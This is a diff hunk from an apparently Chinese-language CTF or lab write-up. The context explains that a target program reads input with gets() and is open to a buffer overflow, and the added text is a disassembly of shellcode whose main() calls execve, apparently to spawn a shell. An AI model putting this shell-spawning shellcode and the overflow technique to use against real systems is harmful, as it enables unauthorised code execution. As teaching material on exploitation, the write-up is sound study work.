@@ -85,7 +85,32 @@ End of assembler dump.
 
 从逆向出来的汇编代码看，程序很简单，使用gets()得到用户输入，然后puts()输出"Authentication failure.\nSorry."提示结束就可以了，没有匹配，也就是没有正确的密码。不过从gets()这是一个不安全的函数，这里也没有边界检查，说明存在缓冲区溢出漏洞，这是可以利用的。
 
-
+服务器的shellcode.s
+```
+//shellcode.s
+00000000000006b0 <main>:                                                                        
+ 6b0:   55                      push   %rbp
+ 6b1:   48 89 e5                mov    %rsp,%rbp
+ 6b4:   48 83 ec 20             sub    $0x20,%rsp
+ 6b8:   89 7d ec                mov    %edi,-0x14(%rbp)
+ 6bb:   48 89 75 e0             mov    %rsi,-0x20(%rbp)
+ 6bf:   48 8d 05 be 00 00 00    lea    0xbe(%rip),%rax        # 784 <_IO_stdin_used+0x4>
+ 6c6:   48 89 45 f0             mov    %rax,-0x10(%rbp)
+ 6ca:   48 c7 45 f8 00 00 00    movq   $0x0,-0x8(%rbp)
+ 6d1:   00  
+ 6d2:   48 8b 45 f0             mov    -0x10(%rbp),%rax
+ 6d6:   48 8d 4d f0             lea    -0x10(%rbp),%rcx
+ 6da:   ba 00 00 00 00          mov    $0x0,%edx
+ 6df:   48 89 ce                mov    %rcx,%rsi
+ 6e2:   48 89 c7                mov    %rax,%rdi
+ 6e5:   e8 76 fe ff ff          callq  560 <execve@plt>
+ 6ea:   b8 00 00 00 00          mov    $0x0,%eax
+ 6ef:   c9                      leaveq     
+ 6f0:   c3                      retq   
+ 6f1:   66 2e 0f 1f 84 00 00    nopw   %cs:0x0(%rax,%rax,1)
+ 6f8:   00 00 00  
+ 6fb:   0f 1f 44 00 00          nopl   0x0(%rax,%rax,1)
+```
 
 ## 3. 
 
